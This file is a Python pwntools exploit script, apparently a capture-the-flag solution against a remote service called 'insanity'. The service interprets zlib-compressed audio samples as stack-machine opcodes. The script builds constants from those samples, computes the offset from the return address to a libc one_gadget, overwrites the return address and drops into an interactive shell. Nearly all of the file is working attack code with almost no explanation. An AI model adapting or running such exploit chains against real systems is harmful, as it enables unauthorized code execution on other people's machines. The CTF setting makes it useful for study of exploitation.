#!/usr/bin/env python
import sys, os
from pwn import *
import zlib

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('insanity'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

with open("./file/insanity.raw") as f:
    insanity = f.read()
with open("./file/insane.raw") as f:
    insane = f.read()
silent = '\x00'*512

patch = len(sys.argv) <= 1

def build(i):
    return xor(((insanity+silent)*i + insane)[1::2], '\x80')

r = remote(HOST, PORT)

def stack():
    if patch:
        exp = zlib.compress('insanity '*1 + 'insane\x00')
    else:
        exp = zlib.compress(build(1))
    r.send(p32(len(exp)))
    r.send(exp)
    r.recvuntil('.')

def add():
    if patch:
        exp = zlib.compress('insanity '*2 + 'insane\x00')
    else:
        exp = zlib.compress(build(2))
    r.send(p32(len(exp)))
    r.send(exp)
    r.recvuntil('.')

def sub():
    if patch:
        exp = zlib.compress('insanity '*3 + 'insane\x00')
    else:
        exp = zlib.compress(build(3))
    r.send(p32(len(exp)))
    r.send(exp)
    r.recvuntil('.')

def mul():
    if patch:
        exp = zlib.compress('insanity '*4 + 'insane\x00')
    else:
        exp = zlib.compress(build(4))
    r.send(p32(len(exp)))
    r.send(exp)
    r.recvuntil('.')

def cmp():
    if patch:
        exp = zlib.compress('insanity '*5 + 'insane\x00')
    else:
        exp = zlib.compress(build(5))
    r.send(p32(len(exp)))
    r.send(exp)
    r.recvuntil('.')

def load(idx):
    if patch:
        exp = zlib.compress('insanity '*6 + 'insane\x00')
    else:
        exp = zlib.compress(build(6))
    r.send(p32(len(exp)))
    r.send(exp)
    if patch:
        exp = zlib.compress('insanity '*idx + 'insane\x00')
    else:
        exp = zlib.compress(build(idx))
    r.send(p32(len(exp)))
    r.send(exp)
    r.recvuntil('.')

def store():
    if patch:
        exp = zlib.compress('insanity '*7 + 'insane\x00')
    else:
        exp = zlib.compress(build(7))
    r.send(p32(len(exp)))
    r.send(exp)
    r.recvuntil('.')

def heap():
    if patch:
        exp = zlib.compress('insanity '*9 + 'insane\x00')
    else:
        exp = zlib.compress(build(9))
    r.send(p32(len(exp)))
    r.send(exp)
    r.recvuntil('.')

def data(d):
    if d == -1: return

    if patch:
        exp = zlib.compress('insanity '*d + 'insane\x00')
    else:
        exp = zlib.compress(build(d))
    r.send(p32(len(exp)))
    r.send(exp)
    r.recvuntil('.')

def make_0():
    stack(); stack(); heap(); cmp(); stack(); add(); mul()

def make_1():
    stack(); stack(); cmp()

def make_2():
    make_1(); make_1(); make_0(); add(); add()

def make_3():
    make_2(); stack(); make_1(); make_0(); add(); add()

def make_4():
    make_2(); stack(); make_2(); mul()

def make_8():
    make_4(); stack(); make_4(); add()

def make_0x10():
    make_4(); stack(); make_4(); mul()

def make_0x100():
    make_0x10(); stack(); make_0x10(); mul()

def make_0x1000():
    make_0x100(); stack(); make_0x10(); mul()

def make_0x8000():
    make_0x1000(); stack(); make_8(); mul()

add()
mul()
mul()
mul()
add()
add()

stack(); make_0x8000()
stack(); make_0x100()
stack(); make_3()
mul(); add()            # 0x8300
stack(); make_0x100()
stack(); make_0x10()
sub(); add()            # 0x83f0
stack(); make_3()
add();                  # 0x83f3

stack(); make_4()
store()                 # store at count[3]
stack(); make_4()
load(0)                 # load back
load(0)                 # load ret addr
add()                   # add off to one gadget
stack(); make_4()
load(0)
store()

# calculae the offset about one_gadget - ret
data(25)
data(30)
data(32)
data(28)
data(38)
data(25)

pause()

r.send(p32(0)) # end
r.interactive()
